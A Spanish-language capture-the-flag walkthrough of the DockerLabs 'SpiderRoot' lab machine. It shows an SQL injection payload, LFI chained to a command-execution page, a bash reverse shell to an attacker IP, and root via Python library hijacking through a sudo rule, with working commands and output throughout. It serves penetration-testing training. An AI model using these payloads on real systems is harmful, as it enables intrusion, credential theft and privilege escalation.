![Screenshot](/medium/SpiderRoot/Images/machine.png)

Dificultad: **media**

Creado por: **Grooti**

# Pasos para pwnear 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotacion)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

Primero, verificamos que la máquina esté activa. Podemos hacerlo con el comando **ping**.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/SpiderRoot]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.227 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.126 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.089 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2047ms
rtt min/avg/max/mdev = 0.089/0.147/0.227/0.058 ms
```

Bien, así que podemos comenzar con la fase de **reconocimiento**.

---

# Reconocimiento

Iniciamos la fase de reconocimiento con **nmap** para escanear qué puertos están abiertos en el objetivo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 21:43 -05
Initiating ARP Ping Scan at 21:43
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 21:43, 0.12s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 21:43
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 21:43, 3.09s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000027s latency).
Scanned at 2025-12-08 21:43:42 -05 for 3s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el puerto 65.535.

**-n** <- Con este argumento, nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ser muy lento.

**-sS** <- Con este argumento, nmap realizará un escaneo de tipo "stealth" (sigiloso), lo que significa que no completará el handshake de tres vías, y también hace que el escaneo sea ligeramente más rápido.

**--min-rate 5000** <- Con este argumento, nmap enviará al menos 5000 paquetes por segundo, haciendo que el escaneo sea aún más rápido.

**-Pn** <- Con este argumento, nmap también omitirá la fase de descubrimiento de hosts, lo que significa que tratará a la máquina como activa y comenzará inmediatamente el escaneo.

**-vv** <- Con este argumento, nmap nos mostrará los puertos abiertos descubiertos mientras continúa el escaneo, lo que significa que si nmap descubre un puerto abierto, lo reportará inmediatamente.

**--open** <- Con este argumento, le decimos a nmap que solo filtre los puertos abiertos.

Una vez que el escaneo finaliza, podemos ver que hay 2 puertos abiertos:

- Puerto 22 (ssh / shell seguro)
- Puerto 80 (http / protocolo de transferencia de hipertexto)

Entonces podemos realizar otro escaneo de nmap para obtener más información sobre estos 2 puertos y ver qué servicios o tecnologías están utilizando.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target --stats-every=1m
```

**-p22,80** <- Con este argumento, nmap solo escaneará estos 2 puertos que descubrimos.

**-sCV** <- Con este argumento, nmap escaneará la versión de cada puerto para detectar posibles vulnerabilidades en sistemas no actualizados, y también realizará un escaneo con algunos scripts que ejecuta nmap para obtener más información sobre estos puertos.

**-oX target** <- Con este argumento, guardamos toda la salida que nmap proporciona y la guardamos como un archivo XML.

**--stats-every=1m** <- Con este argumento, recibimos estadísticas del escaneo cada 1 minuto, esto puede tener minutos (m) y segundos (s).

Después de que el escaneo termine, obtenemos la salida en un archivo XML, lo hacemos para crear una página HTML para ver la información más fácilmente y con mejor apariencia.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo XML a un archivo HTML, ahora vamos a abrirlo.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ open target.html 
```

Y podemos ver esto en nuestro navegador:

![Screenshot](/medium/SpiderRoot/Images/image1.png)

Vemos que el puerto 80 es un sitio web, vamos a echarle un vistazo en nuestro navegador.

![Screenshot](/medium/SpiderRoot/Images/image2.png)

Podemos ver este sitio web, vamos a explorarlo con más detalle.

![Screenshot](/medium/SpiderRoot/Images/image3.png)

Vemos esto, vamos a echar un vistazo al código fuente.

```
<!-- Hint oculto: Algunas vulnerabilidades pueden estar camufladas en caracteres codificados o comentarios. -->
<!-- Hint oculto: Prueba usar OR, AND o comentarios de manera codificada para evadir el WAF. -->
```

Podemos ver estos comentarios que nos dan un poco de ayuda, el mensaje básicamente nos dice que necesitamos usar OR, AND, también comentarios y estar en formato URL codificado, por lo tanto, en resumen necesitamos explotar una **SQLI**.

---

# Explotación

Vamos a usar la siguiente carga útil:

```
' or 1=1-- -
```

En formato codificado URL se vería algo así:

```
%27%20or%201%3D1%2D%2D%20%2D
```

Y podemos ver esto en nuestro navegador:

![Screenshot](/medium/SpiderRoot/Images/image4.png)

Obtenemos credenciales de los usuarios, vamos a intentar iniciar sesión con SSH.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ ssh peter@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:qegAsV1ET03xF9HPURhA8erWxtbRCmYAQ3SOek79ur0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
peter@172.17.0.2's password: 
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Sep  4 00:01:02 2025 from 172.17.0.1
peter@05b3003684a1:~$
```

La que funciona es con el usuario **peter**.

---

# Escalada de privilegios

Después de una larga enumeración para tratar de escalar privilegios, podemos ver que en el directorio **opt** hay un archivo:

```
peter@05b3003684a1:/opt$ ls -la
total 12
drwxrwxr-x 1 root spiderlab 4096 Sep  4 00:17 .
drwxr-xr-x 1 root root      4096 Dec  9 03:36 ..
-rwxr--r-- 1 root root       808 Sep  4 00:17 spidy.py
```

Solo el usuario root puede modificar este archivo, pero podemos leer su contenido. Vamos a ver qué hay dentro de este archivo Python.

```python
#!/usr/bin/env python3
# spidey_run.py - Spider-Man Python Lab

import os
import sys
import json
import math
def web_swing():
    print("🕷️ Spider-Man se balancea por la ciudad.")
    print("Explorando los tejados y vigilando la ciudad...")

def run_tasks():
    print("🕸️ Ejecutando tareas del día...")
    print("Saltos calculados:", math.sqrt(225))
    data = {"hero": "Spider-Man", "city": "New York"}
    print("Registro de datos:", json.dumps(data))

def fight_villains():
    villains = ["Green Goblin", "Doctor Octopus", "Venom"]
    print("Villanos en la ciudad:", ", ".join(villains))
    for v in villains:
        print(f"🕷️ Enfrentando a {v}...")

if __name__ == "__main__":
    web_swing()
    run_tasks()
    fight_villains()
    print("✅ Spider-Man ha terminado su ronda.")
```

Podemos ver que el programa importa algunas bibliotecas, podemos intentar hacer **hijacking de bibliotecas de Python**, pero no funciona, no puedo ejecutarlo y no existe un proceso que ejecute este script Python en un momento determinado.

Pero existe algo interesante en el directorio **/var/www** que contiene el sitio web y algo más también.

```
peter@05b3003684a1:/var/www$ ls
html  internal
```

Vemos otro directorio. Vamos a ver qué hay dentro.

```
peter@05b3003684a1:/var/www/internal$ ls
index.php
```

Vemos un script PHP. Vamos a echarle un vistazo.

```php
peter@05b3003684a1:/var/www/internal$ tail -n 30 index.php 
            max-width: 90%;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <header>Panel Interno del Multiverse</header>
    <main>
        <p>Introduce un comando para ejecutar en el sistema:</p>
        <form method="GET">
            <input type="text" name="cmd" placeholder="Escribe un comando...">
            <input type="submit" value="Ejecutar">
        </form>
        <div class="output">
            <?php
            if (isset($_GET['cmd'])) {
                $cmd = $_GET['cmd'];
                echo "<strong>Salida de:</strong> $cmd\n\n";
                echo "<pre>";
                system($cmd);
                echo "</pre>";
            } else {
                echo "Aquí aparecerá la salida del comando.";
            }
            ?>
        </div>
    </main>
</body>
</html>
```

Podemos ver otro sitio web, este puede ejecutar comandos en el sistema como el usuario **www-data** con el parámetro **cmd**, pero necesitamos ver este sitio web y poder ejecutar comandos en él.

Pero en el sitio web principal podemos ver esto:

```php
peter@05b3003684a1:/var/www/html$ tail -n 30 index.php 
        }
    </style>
</head>
<body>
    <header>
        🕸️ Spider-Verse Nexus 2099 🕷️
    </header>
    <nav>
        <a href="?page=heroes">Héroes</a>
        <a href="?page=multiverse">Multiverso</a>
        <a href="?page=contact">Contacto</a>
    </nav>
    <section>
        <?php
            if (isset($_GET['page'])) {
                $page = $_GET['page'];
                include("pages/" . $page . ".php"); // 🚨 Vulnerabilidad LFI
            } else {
                echo "<h2>🌌 Bienvenido al Spider-Verse 2099</h2>
                <p>Conéctate al nexo del multiverso y descubre secretos ocultos de cada realidad.</p>
                <p><i>“Un gran poder conlleva una gran responsabilidad”</i></p>";
            }
        ?>
    </section>
    <footer>
        © 2099 Spider-Verse | Grooti16 Cybernetics 🧪
    </footer>
</body>
</html>
```

En esta parte del sitio web podemos intentar cargar cualquier archivo PHP del sistema, básicamente una **Inclusión de Archivo Local (LFI)**, por lo que podemos intentar cargar la otra página para ejecutar comandos en el sistema (LFI -> RCE).

Entonces necesitamos modificar el argumento `page` para cargar la otra página.

![Screenshot](/medium/SpiderRoot/Images/image5.png)

Podemos ver esto, pero cuando intentamos ejecutar el comando no lo hacemos bien, pero con el comando curl podemos hacerlo:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/enumeration]
└─$ curl -s 'http://172.17.0.2/?page=../../internal/index&cmd=id' | html2text
k
🕸️ Spider-Verse Nexus 2099 🕷️ Héroes Multiverso Contacto
Panel Interno del Multiverse
Introduce un comando para ejecutar en el sistema:
[cmd                 ][Ejecutar]
Salida de: id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Ahora podemos ejecutar comandos como el usuario **www-data**.

Voy a crear un script de bash para poder ejecutar comandos más fácilmente.

```bash
#!/bin/bash

function ctrl_c {
        echo "[!] Quitting..."
        exit 1
}

trap ctrl_c INT

while true; do
        read -p "[*] Command -> " cmd

        if [[ "$cmd" == "clear" ]]; then
                clear
                continue
        fi

        encoded=$(printf %s "$cmd" | jq -sRr @uri)

        curl -s "http://172.17.0.2/?page=../../internal/index&cmd=$encoded" | html2text | grep -A 100 "Salida"
done
```

En este script de bash podemos ejecutar comandos más fácil y rápido, y codificamos el comando que vamos a ejecutar y hacemos una solicitud al servidor explotando esta LFI a RCE.

```
[*] Command -> id
Salida de: id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(spiderlab)
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Genial, veamos si podemos ver `/etc/passwd`.

```
[*] Command -> cat /etc/passwd 
Salida de: cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
peter:x:1001:1001:peter,,,:/home/peter:/bin/bash
© 2099 Spider-Verse | Grooti16 Cybernetics 🧪
```

Bien, ahora podemos intentar hacer una shell inversa para obtener acceso al sistema como el usuario **www-data**.

Pero primero voy a escuchar con **netcat** en un puerto esperando tráfico en mi máquina atacante.

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l** <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, lo que nos mostrará en más detalle la conexión que recibimos.

**-n** <- Hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquiera, siempre que no esté siendo usado actualmente.

Bien, ahora estamos escuchando en este puerto. Entonces vamos a ejecutar nuestro comando para hacer la shell inversa.

```
[*] Command -> bash -c 'bash -i >& /dev/tcp/192.168.0.20/1234 0>&1'
```

Una vez que ejecutamos este comando, vamos a recibir una shell bash interactiva en nuestra máquina atacante.

Y podemos ver esto en la ventana de netcat:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 38426
bash: cannot set terminal process group (33): Inappropriate ioctl for device
bash: no job control in this shell
www-data@05b3003684a1:/var/www/html$ whoami
whoami
www-data
```

Podemos hacer un tratamiento de la tty para que esta shell inversa sea más cómoda de trabajar.

Primero, hacemos esto:

```
www-data@05b3003684a1:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando crea una nueva sesión bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un registro, pero con la ruta /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute la shell con bash.

Lo hacemos porque queremos usar CTRL + C y más funciones de la bash.

Cuando ejecutamos esto, suspendemos nuestra shell inversa por un momento.

Luego ejecutamos el siguiente comando en nuestra máquina atacante:

```
┌──(craft㉿kali)-[~/…/dockerlabs/medio/SpiderRoot/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de entrada y salida sean crudos.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestra shell inversa de nuevo.

Cuando ejecutamos este comando, reseteamos el xterm:

```
reset xterm
```

Esto va a resetear la terminal.

Si queremos limpiar nuestra terminal, no podemos porque la terminal será diferente de la xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone fea:

```
www-data@05b3003684a1:/$ export TERM=xterm
```

Y una última cosa, si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```
stty rows {num} columns {num}
```

Y finalmente se ve mucho mejor!

Y cuando ejecutamos **sudo -l** obtenemos esto:

```
www-data@05b3003684a1:/$ sudo -l
Matching Defaults entries for www-data on 05b3003684a1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 05b3003684a1:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/spidy.py
```

Ahora podemos ejecutar el **script de Python**!

Entonces podemos hacer una **hijacking de bibliotecas de Python**, ¿por qué podemos escalar privilegios con esto?

Porque siempre que Python busca bibliotecas (scripts también hechos con Python), primero busca las bibliotecas que existen en el directorio de trabajo antes de buscar las bibliotecas realmente confiables, por lo tanto, podemos ejecutar nuestros comandos como el usuario **root**, porque el propietario del script Python es el usuario **root**!

Entonces creamos otro script Python de cualquier biblioteca que esté siendo importada desde el script **spidy.py**.

Las siguientes bibliotecas están siendo importadas desde el script **spidy.py**:

- **os**
- **sys**
- **json**
- **math**

En mi caso voy a usar **json**, para escalar privilegios.

```python
import os

os.system("bash")
```

En ese script vamos a obtener una shell como el usuario **root**.

```
www-data@2a6226f68688:/opt$ ls
json.py  spidy.py
```

Recuerda que el script debe estar en el mismo directorio que vamos a ejecutar nuestra carga útil.

Bien, ahora vamos a ejecutar el script spidy ahora.

```
www-data@2a6226f68688:/opt$ sudo python3 /opt/spidy.py 
root@2a6226f68688:/opt# whoami
root
```

Ahora somos root y podemos ver la bandera!

```
root@2a6226f68688:/opt# cat ~/flag.txt 
⠀⠀⠀⠀⠀⠀⠀⢀⠆⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡀⠀⠰⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡏⠀⢀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⡀⠀⢹⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⡟⠀⠀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣧⠀⠀⢻⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣿⠁⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣇⠀⠈⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣾⡇⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡀⠀⢸⣿⡇⠀⠀⠀
⠀⠀⠀⢸⣿⠀⠀⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣇⠀⠈⣿⡇⠀⠀⠀
⠀⠀⠀⣿⣿⠀⠀⣿⣿⣧⣤⣤⣤⣤⣤⣤⡀⠀⣀⠀⠀⣀⠀⢀⣤⣤⣤⣤⣤⣤⣼⣿⣿⠀⠀⣿⣿⠀⠀⠀
⠀⠀⢸⣿⡏⠀⠀⠀⠙⢉⣉⣩⣴⣶⣤⣙⣿⣶⣯⣦⣴⣼⣷⣿⣋⣤⣶⣦⣍⣉⠋⠀⠀⠀⢸⣿⡇⠀⠀
⠀⠀⢿⣿⣷⣤⣶⣶⠿⠿⠛⠋⣉⣉⠙⢛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⢉⣉⠙⠛⠿⠿⣶⣶⣤⣾⣿⡿⠀⠀
⠀⠀⠀⠙⠻⠋⠉⠀⠀⠀⣠⣾⡿⠟⠛⣻⣿⣿⣿⣿⣿⣿⣿⡍⠻⣷⣄⡀⠙⠿⣷⣤⡀⠀⠀⠀⠉⠙⠟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠿⠋⢀⣠⣾⠟⢫⣿⣿⣿⣿⣿⣿⡗⠀⠙⣿⣿⡇⠀⠈⠛⢿⣦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⡿⠛⠁⠀⢸⣿⣿⠋⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠙⠻⣷⣦⣀⠀⣀
⢀⠀⣀⣴⣾⠟⠋⠀⠀⠀⠀⢸⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠈⠙⣿⣿⡟
⢸⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠈⣿⣿⣿⣿⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡇
⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⢹⣿⣿⣿⣿⡏⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡇
⢸⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⢿⣿⣿⡿⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠈⠿⠿⠁⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠀
⠀⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀
⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⣾⠏⠀⠀
⠀⠀⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠀⠀
⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⠀⠀⠀⠀⠀⠀⠜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀



Grooti16
```

***...pwned..!***
